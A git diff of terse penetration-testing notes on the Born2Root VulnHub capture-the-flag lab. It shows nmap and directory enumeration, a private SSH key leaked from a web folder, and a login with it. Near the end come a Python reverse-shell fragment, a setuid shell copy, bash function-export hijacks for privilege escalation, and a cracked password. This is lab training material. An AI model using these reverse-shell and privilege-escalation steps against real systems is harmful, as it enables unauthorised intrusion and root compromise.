@@ -2,81 +2,78 @@ https://infosecjohn.blog/posts/vulnhub-born2root-1/
 https://www.hackingarticles.in/hack-born2root-vm-ctf-challenge/
 
 
+# Description
 
 When you see the ascii text that mean Born2Root's CTF challenge Is UP
 
-    Hack it , reach root and capture the flag.
-
-    Born2root is based on debian 32 bits so you can run it even if Intel VT-X isn't installed .
-
-    Enumeration is the key.
-
-    Level: Intermediate
-
-I hope you will enjoy it !!
-Doesn't work with VMware. Virtualbox only.
+- Hack it , reach root and capture the flag.
+- Born2root is based on debian 32 bits so you can run it even if Intel VT-X isn't installed .
+- Enumeration is the key.
+- Level: Intermediate
 
 
-└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.14
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 21:45 CEST
-Nmap scan report for 192.168.110.14
-Host is up (0.0012s latency).
-Not shown: 65531 closed ports
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)
-|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)
-|   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)
-|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:cd:df:13:76:32:4e (ED25519)
-80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
-| http-robots.txt: 2 disallowed entries 
-|_/wordpress-blog /files
-|_http-server-header: Apache/2.4.10 (Debian)
-|_http-title:  Secretsec Company 
-111/tcp   open  rpcbind 2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100024  1          33100/tcp   status
-|   100024  1          46196/tcp6  status
-|   100024  1          47878/udp   status
-|_  100024  1          54836/udp6  status
-33100/tcp open  status  1 (RPC #100024)
-MAC Address: 08:00:27:E8:AF:79 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.9
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+# Scan `nmap`
 
-TRACEROUTE
-HOP RTT     ADDRESS
-1   1.18 ms 192.168.110.14
+    $ sudo nmap -sT -A -Pn -n -p- 192.168.110.6
+    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 21:45 CEST
+    Nmap scan report for 192.168.110.6
+    Host is up (0.0012s latency).
+    Not shown: 65531 closed ports
+    PORT      STATE SERVICE VERSION
+    22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+    | ssh-hostkey: 
+    |   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)
+    |   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)
+    |   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)
+    |_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:cd:df:13:76:32:4e (ED25519)
+    80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+    | http-robots.txt: 2 disallowed entries 
+    |_/wordpress-blog /files
+    |_http-server-header: Apache/2.4.10 (Debian)
+    |_http-title:  Secretsec Company 
+    111/tcp   open  rpcbind 2-4 (RPC #100000)
+    | rpcinfo: 
+    |   program version    port/proto  service
+    |   100000  2,3,4        111/tcp   rpcbind
+    |   100000  2,3,4        111/udp   rpcbind
+    |   100000  3,4          111/tcp6  rpcbind
+    |   100000  3,4          111/udp6  rpcbind
+    |   100024  1          33100/tcp   status
+    |   100024  1          46196/tcp6  status
+    |   100024  1          47878/udp   status
+    |_  100024  1          54836/udp6  status
+    33100/tcp open  status  1 (RPC #100024)
+    MAC Address: 08:00:27:E8:AF:79 (Oracle VirtualBox virtual NIC)
+    Device type: general purpose
+    Running: Linux 3.X|4.X
+    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+    OS details: Linux 3.2 - 4.9
+    Network Distance: 1 hop
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.12 seconds
+    TRACEROUTE
+    HOP RTT     ADDRESS
+    1   1.18 ms 192.168.110.6
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 14.12 seconds
 
 
 
-http://192.168.110.14/
+http://192.168.110.6/
 Martin N
 Hadi M
 Jimmy S
 martin@secretsec.com
 
 
-└─$ curl http://192.168.110.14/robots.txt  
+└─$ curl http://192.168.110.6/robots.txt  
 User-agent: *
 Disallow: /wordpress-blog
 Disallow: /files
 
-gobuster dir -u http://192.168.110.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
+gobuster dir -u http://192.168.110.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
 
 
 martin
@@ -85,7 +82,7 @@ jimmy
 
 
 
-└─$ dirb http://192.168.110.14/                                                      130 ⨯
+└─$ dirb http://192.168.110.6/
 
 -----------------
 DIRB v2.22    
@@ -93,23 +90,23 @@ By The Dark Raver
 -----------------
 
 START_TIME: Wed Apr 14 09:12:06 2021
-URL_BASE: http://192.168.110.14/
+URL_BASE: http://192.168.110.6/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
 GENERATED WORDS: 4612                                                          
 
----- Scanning URL: http://192.168.110.14/ ----
-==> DIRECTORY: http://192.168.110.14/files/                                               
-==> DIRECTORY: http://192.168.110.14/icons/                                               
-+ http://192.168.110.14/index.html (CODE:200|SIZE:5651)                                   
-==> DIRECTORY: http://192.168.110.14/manual/                                              
-+ http://192.168.110.14/robots.txt (CODE:200|SIZE:57)                                     
-+ http://192.168.110.14/server-status (CODE:403|SIZE:302)                                 
+---- Scanning URL: http://192.168.110.6/ ----
+==> DIRECTORY: http://192.168.110.6/files/                                               
+==> DIRECTORY: http://192.168.110.6/icons/                                               
++ http://192.168.110.6/index.html (CODE:200|SIZE:5651)                                   
+==> DIRECTORY: http://192.168.110.6/manual/                                              
++ http://192.168.110.6/robots.txt (CODE:200|SIZE:57)                                     
++ http://192.168.110.6/server-status (CODE:403|SIZE:302)                                 
  
 
-└─$ curl http://192.168.110.14/icons/VDSoyuAXiO.txt
+└─$ curl http://192.168.110.6/icons/VDSoyuAXiO.txt
 
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC
@@ -140,7 +137,27 @@ rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+
 -----END RSA PRIVATE KEY-----
 
 
-└─$ ssh martin@192.168.110.14 -i /home/kali/OSCP/boxes/born2root-1/key
+└─$ ssh martin@192.168.110.6 -i /home/kali/OSCP/boxes/born2root-1/key
+
+└─$ ssh martin@192.168.110.6 -i /home/kali/OSCP/boxes/born2root-1/key
+The authenticity of host '192.168.110.6 (192.168.110.6)' can't be established.
+ED25519 key fingerprint is SHA256:y7AzR/QI4CJW3DLNEfBYopBbKkUP12PZv3vt+1ZQP6E.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.110.6' (ED25519) to the list of known hosts.
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun  9 20:31:29 2017 from 192.168.0.42
+
+READY TO ACCESS THE SECRET LAB ? 
+
+secret password : 
+WELCOME ! 
 
 
 
@@ -172,3 +189,26 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
+
+
+
+import os; os.system('cp /bin/sh /tmp/sh'); os.system('chmod 4755 /tmp/sh');
+
+bash-4.2$ function /usr/bin/sl () { /bin/bash; }
+bash-4.2$ export -f /usr/bin/sl
+
+function /sbin/ifconfig() { /bin/bash; }
+export -f /sbin/ifconfig
+
+
+
+hadi : hadi123
+
+cupp
+john
+cewl
+crunch
+
+
+
+# Boxe
